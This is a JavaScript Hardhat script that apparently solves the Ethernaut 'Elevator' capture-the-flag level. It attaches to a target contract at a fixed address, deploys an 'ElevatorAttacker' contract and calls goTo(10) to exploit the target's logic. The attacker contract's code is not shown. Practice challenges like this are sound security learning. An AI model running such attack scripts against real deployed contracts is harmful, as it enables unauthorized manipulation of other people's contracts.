const { ethers } = require("hardhat");

const ELEVATOR_CONTRACT_NAME = "Elevator";
const ELEVATOR_CONTRACT_ADDRESS = "0x0C7E48D449c5aa33Aec28C83DBf95F4B27D124AE";
const ELEVATOR_IN_BUILDING_CONTRACT_NAME = "ElevatorAttacker";

async function main() {
    const elevatorFactory = await ethers.getContractFactory(ELEVATOR_CONTRACT_NAME);
    const elevatorContract = elevatorFactory.attach(ELEVATOR_CONTRACT_ADDRESS);
    console.log("Attached Elevator Contract to Factory");

    const buildingElevatorFactory = await ethers.getContractFactory(ELEVATOR_IN_BUILDING_CONTRACT_NAME);

    const buildingElevatorContract = await buildingElevatorFactory.deploy();
    await buildingElevatorContract.waitForDeployment();

    const ELEVATOR_IN_BUILDING_CONTRACT_ADDRESS = await buildingElevatorContract.getAddress();
    console.log("Elevator in Building Contract deployed at: ", ELEVATOR_IN_BUILDING_CONTRACT_ADDRESS);

    const tx = await buildingElevatorContract.goTo(10, await elevatorContract.getAddress());
    await tx.wait();

}

main().catch(error => {
    console.error(error);
    process.exit(1);
})